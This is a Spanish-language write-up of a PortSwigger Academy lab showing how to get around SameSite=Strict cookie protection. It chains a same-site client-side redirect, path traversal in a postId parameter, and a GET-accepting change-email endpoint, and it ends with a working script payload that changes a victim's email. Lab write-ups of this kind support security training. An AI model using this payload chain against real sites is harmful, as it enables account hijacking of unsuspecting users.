# PortSwigger Lab: SameSite Strict bypass via client-side redirect

**Plataforma:** PortSwigger Web Security Academy  
**Dificultad:** Difícil  
**Tipo:** CSRF (Cross-Site Request Forgery)  
**Objetivo:** Cambiar email bypasseando SameSite=Strict con client-side redirect  
**Credenciales:** `wiener:peter`

---

## Flujo del ataque

```
SameSite=Strict bloquea CSRF cross-site
→ Buscar redirect mal configurado en el mismo dominio
→ Path traversal para acceder a /my-account/change-email
→ GET request con parámetros URL-encoded
→ Redirect same-origin bypasea SameSite Strict
→ Cookie enviada, email cambiado
```

---

## 1. Análisis inicial

![POST change email request](imagen-1-post-change-email.png)

### Petición de cambio de email

```http
POST /my-account/change-email HTTP/2
Cookie: session=aVxXnK3YL2RcyrjEUDFMFrdK3Pof7Q58

email=user@user.es&submit=1
```

Sin token CSRF.

### SameSite Strict activo

Intentar payload cross-site simple falla. El servidor trata como cross-site.

SameSite=Strict bloquea cookie en peticiones desde otro dominio (incluso GET).

---

## 2. Búsqueda del redirect

![Client-side redirect from blog](imagen-2-get-from-exploit.png)

Navegando la plataforma, encontramos un blog con comentarios.

Al comentar, redirige a: `/post/comment/confirmation?postId=4`

Este endpoint redirige a `/post/{postId}` (client-side, desde el mismo dominio).

**Breakthrough:** Redirect controlable en mismo dominio.

---

## 3. Sistema de comentarios

![Blog comment form](imagen-3-blog-comments.png)

Formulario de comentarios con:
- Comment text
- Name
- Email
- Website

Al enviar, muestra "Thank you" y redirige.

Confirma que `/post/comment/confirmation?postId=X` es el redirect.

---

## 4. Path traversal en redirect

Intentamos:

```
?postId=../my-account?id=wiener
```

**Resultado:** Redirige a `/my-account?id=wiener`

La ruta `/post/../my-account` se normaliza a `/my-account`.

**Path traversal funciona.**

---

## 5. Inyección de change-email endpoint

![GET request with email parameters](imagen-4-thank-you-comment.png)

Convertimos POST a GET:

```http
GET /my-account/change-email?email=test@user.es&submit=1
```

El servidor acepta GET (no requiere POST).

### Combinar con path traversal

```
?postId=../my-account/change-email?email=test@user.es&submit=1
```

**Problema:** El `&` confunde al parser de parámetros.

**Solución:** URL encode `&` como `%26`:

```
?postId=../my-account/change-email?email=test%40user.es%26submit=1
```

**Resultado:** `302 Found`

Redirige a `/my-account/change-email?email=test@user.es&submit=1`

Email se cambia porque es same-origin → SameSite Strict permite cookie.

---

## 6. Por qué funciona

### Timing de SameSite Strict

1. Atacante envía: `document.location = "https://target.com/post/comment/confirmation?postId=..."`
2. Navegador ve: GET a same-origin ✅
3. SameSite Strict: Permite cookie
4. Servidor genera redirect a `/my-account/change-email?...`
5. Navegador sigue redirect (same-origin) ✅
6. Cookie persiste
7. Email cambiado

**La clave:** SameSite Strict solo bloquea si petición **inicial** es cross-site. Los redirects **dentro del mismo dominio** son same-origin.

---

## 7. Técnicas combinadas

Este lab usa:
- **Redirect no sanitizado** (acepta postId)
- **Path traversal** (../)
- **GET en POST endpoint** (change-email)
- **URL encoding** (%26 para &)
- **SameSite Strict bypass** (via same-origin redirect)
- **IDOR** (postId=2,3,4...)
- **Sin CSRF token**

---

## 8. Payload final

![Email changed via GET with submit parameter](imagen-5-get-change-email.png)

```html
<script>
  document.location = "https://target.com/post/comment/confirmation?postId=../my-account/change-email?email=hacked%40user.es%26submit=1"
</script>
```

**Flujo:**

1. Víctima accede desde otro sitio
2. Script ejecuta (GET)
3. SameSite Strict: cookie permitida (same-origin)
4. Path traversal al endpoint de cambio
5. Redirect a /my-account/change-email
6. Email cambiado a hacked@user.es

---

## 9. Lab resuelto

![Congratulations solved](imagen-6-lab-solved.png)

---

## Por qué es peligroso

- SameSite Strict parece defensa suficiente
- Pero redirects **mismo-dominio** bypasean protección
- Sin tokens CSRF, cualquier cambio es vulnerable
- Combinación de fallos menores = vulnerabilidad grave

---

## Referencias

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [MDN — SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP — Open Redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
